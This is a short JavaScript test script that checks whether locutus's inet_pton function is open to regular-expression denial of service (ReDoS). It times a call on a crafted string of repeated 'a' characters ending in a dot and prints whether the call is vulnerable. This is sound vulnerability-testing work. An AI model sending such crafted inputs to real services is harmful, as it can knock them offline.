// test("ReDos in locutus", () => {
  const genstr = require("../utils").genstr;
  const measureTime = require("../utils").measureTime;
  const inet_pton = require("locutus/php/network/inet_pton");
  const attack_str = new Array(30).fill("a").join("") + ".";
  let t = measureTime(function () {
    inet_pton(attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
if (time > 1) {
	console.log("this_is_vulnerable")
} else {
	console.log("this_is_OK")
}
// });
